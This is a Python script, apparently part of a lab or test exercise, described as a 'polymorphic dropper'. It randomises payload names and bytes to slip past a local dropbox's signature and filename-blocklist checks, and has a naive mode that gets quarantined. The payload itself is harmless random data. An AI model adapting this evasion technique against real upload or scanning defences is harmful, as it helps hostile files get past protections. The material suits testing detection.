#!/usr/bin/env python3
"""Polymorphic dropper: mutate payload bytes and name so the dropbox check passes.

Usage: 0002-polymorph-dropper.py --target http://127.0.0.1:PORT [--naive] [--out payload.bin]
--naive emits a payload carrying the QA signature marker (gets quarantined).
"""
import argparse
import json
import secrets
import sys
import urllib.error
import urllib.request

SIGNATURE_MARKER = b"QA-SIGNATURE-MARKER"
BLOCKLISTED_NAMES = ("payload.exe", "dropper.bin", "shell.sh")


def make_payload(naive: bool):
    """Return (filename, bytes). Polymorphic unless naive is set."""
    if naive:
        return "payload.exe", SIGNATURE_MARKER + b"\n" + secrets.token_bytes(32)
    name = "img-" + secrets.token_hex(6) + ".dat"
    body = secrets.token_bytes(64) + b"\nstage2\n"
    return name, body


def submit(target: str, name: str, body: bytes):
    """POST the payload to the dropbox; return the response status and headers."""
    req = urllib.request.Request(
        target + "/submit", data=body, method="POST",
        headers={"X-Filename": name, "Content-Type": "application/octet-stream"},
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, dict(resp.headers), resp.read().decode()


def main(argv=None):
    parser = argparse.ArgumentParser(description="glass-canary polymorphic dropper")
    parser.add_argument("--target", required=True)
    parser.add_argument("--naive", action="store_true")
    parser.add_argument("--out", default=None)
    args = parser.parse_args(argv)
    name, body = make_payload(args.naive)
    try:
        status, headers, text = submit(args.target, name, body)
    except urllib.error.HTTPError as exc:
        print(f"[drop] quarantined: {exc.code} {dict(exc.headers).get('X-Verdict', '')}")
        return 1
    except urllib.error.URLError as exc:
        print(f"[drop] failed: {exc}", file=sys.stderr)
        return 2
    print(f"[drop] submitted {name} ({len(body)} bytes) -> {status}")
    print(f"[drop] receipt: {headers.get('X-Receipt', text.strip())}")
    if args.out:
        with open(args.out, "wb") as fh:
            fh.write(body)
    return 0


if __name__ == "__main__":
    sys.exit(main())
